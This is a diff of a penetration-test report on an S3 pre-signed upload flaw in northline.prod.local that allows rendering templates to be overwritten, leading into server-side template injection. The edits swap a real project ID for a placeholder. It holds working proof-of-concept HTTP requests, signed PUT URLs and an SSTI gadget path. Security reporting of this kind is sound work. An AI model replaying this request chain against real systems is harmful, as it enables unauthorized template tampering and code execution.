@@ -82,7 +82,7 @@ Observe that we can see the member's Full Name and their email address.
 
 # Finding 2: 
 
-## Arbitrary Storage Key Path Manipulation (S3 Pre-Signed Uploads) on northline.prod.local:9080 through /api/projects/{project_id}/uploads/sign via POST parameter "key" leading to unauthorized modification of rendering templates
+## Arbitrary Storage Key Path Manipulation (S3 Pre-Signed Uploads) on northline.prod.local:9080 through /api/projects/{target_workspace_uuid}/uploads/sign via POST parameter "key" leading to unauthorized modification of rendering templates
 
 - Target: **northline.prod.local:9080**
 - Vulnerable Endpoint: **POST /api/projects/{project_id}/uploads/sign**
@@ -103,7 +103,7 @@ As a result, the attacker can leverage the generated pre-signed URL to upload an
 - To generate a valid AWS HMAC-SHA256 pre-signed **PUT** URL, send the following **POST request**:
 
 ```http
-POST /api/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/uploads/sign HTTP/1.1
+POST /api/projects/{target_workspace_uuid}/uploads/sign HTTP/1.1
 Host: northline.prod.local:9080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 Accept: */*
@@ -127,7 +127,7 @@ Observe that the server responded with a PUT URL that we can now use to modify t
 - To modify the rendering template asset, send the following **PUT request**, inserting the PUT URL parameters noted within the previous step.
 
 ```http
-PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T035045Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=5b163533a44710b39e05b63d43c2aa3204c436e5fc4b3cc03a945de2f15c2739 HTTP/1.1
+PUT /nl-assets/projects/{target_workspace_uuid}/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T035045Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=5b163533a44710b39e05b63d43c2aa3204c436e5fc4b3cc03a945de2f15c2739 HTTP/1.1
 Host: northline.prod.local:9080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 Accept: */*
@@ -171,10 +171,10 @@ As a result, the attacker can access `self.__init__.__globals__.sys.modules['__m
 
 ### Proof of Concept
 
-- Using the unauthorized rendering template modification vulnerability from the previous step, we can confirm that the web application is vulnerable to SSTI, by sending the following request:
+- Using the unauthorized rendering template modification vulnerability from the previous step, we can confirm that the web application is vulnerable to SSTI, by sending the following request. Make sure to replace the PUT URL request with the generated URL from the previous finding. In our case, I have used the generated value within my session.
 
 ```http
-PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T040115Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=3cc5e2d6c0c930e1f33bda5e42f5e0c5f3ad8c0b9213e9e5fccd63694f4272e1 HTTP/1.1
+PUT /nl-assets/projects/{target_workspace_uuid}/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T040115Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=3cc5e2d6c0c930e1f33bda5e42f5e0c5f3ad8c0b9213e9e5fccd63694f4272e1 HTTP/1.1
 Host: northline.prod.local:9080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 Accept: */*
